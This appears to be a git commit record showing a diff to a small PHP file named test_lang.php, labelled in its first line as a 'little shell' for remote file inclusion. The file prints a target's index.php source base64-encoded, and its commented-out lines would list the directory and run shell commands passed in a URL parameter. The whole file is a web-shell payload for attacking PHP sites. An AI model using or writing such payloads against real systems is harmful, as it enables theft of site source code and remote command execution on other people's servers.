dd1df990f955d660bc681f24567663141ad7dc3e
Iosig Koshich <motroniii@gmail.com>
2017-06-16 00:45:27 +0300

    Create test_lang.php

--- test_lang.php
+++ test_lang.php
@@ -1,7 +1,7 @@
 // Little shell for RFI
 
 <?php
-echo file_get_contents('index.php');
+echo base64_encode(file_get_contents('index.php'));
 //print_r(scandir('./'));
 //echo shell_exec($_GET['e']); 
 ?>
